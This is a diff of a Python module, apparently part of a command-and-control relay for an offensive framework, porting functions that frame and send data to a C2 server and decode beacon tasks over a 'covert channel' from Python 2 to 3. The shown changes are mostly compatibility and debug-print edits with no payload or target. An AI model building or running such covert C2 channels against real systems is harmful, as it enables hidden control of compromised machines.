@@ -19,7 +19,17 @@ def createSocket():
 
 def sendFrameToC2(sock, chunk):
 	slen = struct.pack('<I', len(chunk))
+	#print (type(slen))
+	#print (slen)
+
+	if isinstance(chunk, bytes):
+		pass
+	else: chunk = chunk.encode('utf-8')
+
+
+	#chunk = bytes(str(chunk), "utf-8")
 	sock.sendall(slen + chunk)
+	#sock.sendall(slen + chunk.encode('utf-8'))
 
 def recvFrameFromC2(sock):
 	try:
@@ -55,10 +65,10 @@ def retrieveData(beaconId):
 	# data = transport.retrieveData(beaconId)
 
 	if config.debug:
-		print (color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (data)
+		print((color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (taskData))
 
 	# Prepare the recieved data by running it through the decoder
-	for i in xrange(len(taskData)):
+	for i in range(len(taskData)):
 		taskData[i] = decodeData(taskData[i])
 	# preped_data = decodeData(data)
 
@@ -70,7 +80,7 @@ def sendData(data, beaconId):
 	# returns a confirmation that the data has been sent
 
 	if config.debug:
-		print (color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s") % (data)
+		print((color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s") % (data))
 	# Prepares the data to be sent via the covert channel
 	preped_data = prepData(data)
 
